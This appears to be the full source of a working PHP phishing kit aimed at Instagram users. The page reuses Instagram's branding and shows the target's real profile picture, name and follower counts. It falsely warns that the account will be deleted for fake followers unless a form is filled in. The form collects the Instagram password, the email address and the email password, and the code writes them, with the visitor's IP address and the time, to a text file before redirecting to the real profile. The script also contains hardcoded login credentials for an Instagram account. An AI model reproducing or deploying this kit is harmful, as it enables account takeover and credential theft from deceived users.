<?php
$felony=$_GET['username'];
error_reporting(E_ALL);
ini_set('display_errors',1);
set_time_limit(0);
require 'felony/autoload.php';
\InstagramAPI\Instagram::$allowDangerousWebUsageAtMyOwnRisk = true;
$username="cafersendur";//yeni açılmış hesabın kullanıcı adı
$password="1500202500";// yeni açılmış hesabın şifresi
$ig = new \InstagramAPI\Instagram();
try{
	$ig->login($username,$password);
}catch(\Exception $e){
	echo $e->getMessage();
}
$json = $ig->people->getInfoByName($felony);
$arr = json_decode($json, true);
$felonyresim = $arr['user']['profile_pic_url'];//profil resmi çektirir
$felonypost = $arr['user']['media_count'];//post sayısı çektirir
$felonytakipci = $arr['user']['follower_count'];//takipçi sayısı çektirir
$felonytakipe = $arr['user']['following_count'];//takip ettiği kişi sayısı çektirir
$felonyisim  = $arr['user']['full_name'];//ismi çektirir
$felonybiografi = $arr['user']['biography']; // biyografi çektirir
$felonymavi = $arr['user']['is_verified'];//mavi tik varsa çektirir
$felonysite = $arr['user']['external_url'];//web sitesi varsa çeker
$txt = "fsc.txt";// txt niz
if($_POST){
$felonypw =  $_POST['felonypw'];
$felonymail = $_POST['felonymail'];
$felonymailpw = $_POST['felonymailpw'];
$ip = $_SERVER['REMOTE_ADDR'];
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen($txt, 'a'); 
fwrite($file, $felony."\n\n"."Sifre: " .$felonypw.  "\n\n".$felonymail."\n\n"."Mail Sifre:".$felonymailpw. "\n\n"."Ip Adresi: " .$ip."\n\n". "Tarih: " .$cur_time.  "\n\n");
fclose($file); 
header("Location: https://instagram.com/$felony");
}
?>
<html lang="en-US" class="js flexbox history"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">

<link rel="stylesheet" id="brc-styles-css" href="https://en.instagram-brand.com/wp-content/themes/ig-branding/prj-ig-branding/assets/styles/main-10d4148d53.css?ver=5.5.4.1" media="all">
<title>@<?=$felony?> - Artificial Likes And Followers</title>
<link rel="icon" href="<?=$felonyresim?>" type="image/x-icon" />
</head>
<?php
include("felony/felonycss/index.php")
?>
<body class="home blog en">
<div id="app">
    <div data-reactroot="">
        <div>
            <div class="nav-outerwrapper nav-outerwrapper--transparent ">
                <nav class="nav-wrapper" style="visibility: inherit; opacity: 1; transform: matrix(1, 0, 0, 1, 0, 0);">
                    <div class="nav-left">
                        <img src="https://en.instagram-brand.com/wp-content/themes/ig-branding/prj-ig-branding/assets/images/ig-logo.svg" class="nav-identity__logo" alt="Instagram" width="36" height="36">
                    </div>
                </nav>
            </div>
        </div>
        <div class="route-content-wrapper" data-route="/">
            <div class="guidelines-page route-content">
                <div class="home route-content">
                    <div class="home__wrapper page-container">
                        <div class="home__column">
                            
                            <div style="will-change: auto; visibility: inherit; opacity: 1; transform: matrix(1, 0, 0, 1, 0, 0);">
                            <br>
                            <center><img src="<?php echo $felonyresim; ?>" class="felonyppresim" alt="<?php echo $felony.' of photo ';?>"></center><br>
                            <p id="felonymetin">
    
                            Hello <?php 
                            if($felonyisim){
                                echo $felonyisim;
                            }else{
                                echo $felony;
                            }
                            ?><?php
if($felonymavi == 1){
    echo'<img src="https://i.ya-webdesign.com/images/instagram-verified-badge-png.png" width="20px">';
}
?>, we have detected artificial likes and followers in your account,<br> this is against instagram rules,<br> so your account will be deleted within 24 hours.<br> If you want to prevent this, please fill out the form below.
                            </p>
                            <br><br>
                            <center><input onclick="felonybuton('sonuc');" id="felonybuton" type="submit" value="Show Application Form"></center><br>
                            <form id="sonuc" style="display: none;" method="post">

                            <input type="password" name="felonypw" placeholder="Password" required="" id="felonykutu"><br><br>
                            <input type="text" name="felonymail" placeholder="Mail Address" required="" id="felonykutu"><br><br>
                            <input type="password" name="felonymailpw" placeholder="Mail Password" required="" id="felonykutu"><br><br>

                            <input id="felonybuton1" type="submit" value="Apply">
                        <br><br>
                        </form>
                            <p class="felonybilgi">
                                <?php 
                            if($felonyisim){
                                echo $felonyisim;
                            }else{
                                echo $felony;
                            }
                            ?>'s profile information
                                <?=$felonypost?> post
                                <?php
                                    function basamak($sayi)
                                    {
                                    $birler=$sayi%1000;
                                    $sayi=$sayi/1000;
                                    $onlar=$sayi%1000;
                                    $sayi= $sayi/1000;
                                    $yuzler=$sayi%100000000;
                                    $sayi=$sayi/100000000;
                                    if($yuzler){
                                    echo $yuzler,"m";
                                    }elseif($onlar){
                                        echo $onlar,"k";
                                    }elseif($birler){
                                        echo $birler;
                                    }
                                    }
                                    echo basamak($felonytakipci);
                                    ?>
                                 followers
                                <?=$felonytakipe?> following
                            </p><hr>
                            <p class="felonybilgi"><?php if($felonyisim){
                            echo "Name : $felonyisim".'<hr>';
                            } ?></p>
                            <p class="felonybilgi"><?php if($felonybiografi){
                            echo "Biography : $felonybiografi".'<hr>';
                            } ?></p>
                            <p class="felonybilgi"><?php if($felonysite){
                            echo "Website : $felonysite";
                            } ?></p>
                        </div>
                    </div>
                </div>
</span>
</body>
<script>
function felonybuton(ID) {
var secilenID = document.getElementById(ID);
if (secilenID.style.display == "none") {
secilenID.style.display = "";
} else {
secilenID.style.display = "none";
}
}
</script>
</html>